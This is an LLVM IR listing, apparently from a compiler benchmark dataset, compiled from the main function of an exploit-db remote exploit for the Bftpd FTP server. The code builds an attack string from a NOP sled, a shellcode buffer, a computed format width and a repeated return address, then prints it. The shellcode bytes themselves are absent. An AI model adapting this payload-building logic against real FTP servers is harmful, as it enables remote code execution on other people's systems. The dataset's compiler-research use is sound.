; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_204.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_204.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ADDR = common dso_local global i64 0, align 8
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [3 x i8] c"%.\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"%dd\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"%c%c%c%c\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [32 x i8] c"Bftpd remote exploit, by DiGiT\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"Using Address = 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [256 x i8], align 16
  %8 = alloca [32 x i8], align 16
  %9 = alloca [256 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  store i32 100, i32* %12, align 4
  %15 = load i64, i64* @ADDR, align 8
  store i64 %15, i64* %14, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp sgt i32 %16, 1
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @atoi(i8* %21)
  store i32 %22, i32* %10, align 4
  br label %23

23:                                               ; preds = %18, %2
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %25 = load i32, i32* %12, align 4
  %26 = call i32 @memset(i8* %24, i8 signext -112, i32 %25)
  %27 = load i64, i64* %14, align 8
  %28 = load i32, i32* %10, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %27, %29
  store i64 %30, i64* %14, align 8
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %33 = call i32 @strcpy(i8* %31, i8* %32)
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %35 = load i8*, i8** @shellcode, align 8
  %36 = call i32 @strcat(i8* %34, i8* %35)
  %37 = load i8*, i8** @shellcode, align 8
  %38 = call i32 @strlen(i8* %37)
  %39 = sub nsw i32 1024, %38
  %40 = load i32, i32* %12, align 4
  %41 = sub nsw i32 %39, %40
  %42 = add nsw i32 %41, 4
  %43 = sub nsw i32 %42, 14
  store i32 %43, i32* %11, align 4
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %45 = call i32 @strcat(i8* %44, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %47 = load i32, i32* %11, align 4
  %48 = trunc i32 %47 to i8
  %49 = call i32 (i8*, i8*, i8, ...) @sprintf(i8* %46, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8 zeroext %48)
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %52 = call i32 @strcat(i8* %50, i8* %51)
  %53 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %54 = load i64, i64* %14, align 8
  %55 = ashr i64 %54, 0
  %56 = and i64 %55, 255
  %57 = trunc i64 %56 to i8
  %58 = load i64, i64* %14, align 8
  %59 = ashr i64 %58, 8
  %60 = and i64 %59, 255
  %61 = trunc i64 %60 to i8
  %62 = zext i8 %61 to i32
  %63 = load i64, i64* %14, align 8
  %64 = ashr i64 %63, 16
  %65 = and i64 %64, 255
  %66 = trunc i64 %65 to i8
  %67 = zext i8 %66 to i32
  %68 = load i64, i64* %14, align 8
  %69 = ashr i64 %68, 24
  %70 = and i64 %69, 255
  %71 = trunc i64 %70 to i8
  %72 = zext i8 %71 to i32
  %73 = call i32 (i8*, i8*, i8, ...) @sprintf(i8* %53, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8 zeroext %57, i32 %62, i32 %67, i32 %72)
  store i32 0, i32* %13, align 4
  br label %74

74:                                               ; preds = %81, %23
  %75 = load i32, i32* %13, align 4
  %76 = icmp slt i32 %75, 4
  br i1 %76, label %77, label %84

77:                                               ; preds = %74
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %79 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %80 = call i32 @strcat(i8* %78, i8* %79)
  br label %81

81:                                               ; preds = %77
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %74

84:                                               ; preds = %74
  %85 = load i32, i32* @stderr, align 4
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %85, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %87 = load i32, i32* @stderr, align 4
  %88 = load i64, i64* %14, align 8
  %89 = call i32 (i32, i8*, ...) @fprintf(i32 %87, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i64 %88)
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %91 = call i32 @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* %90)
  ret i32 0
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8 zeroext, ...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @printf(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
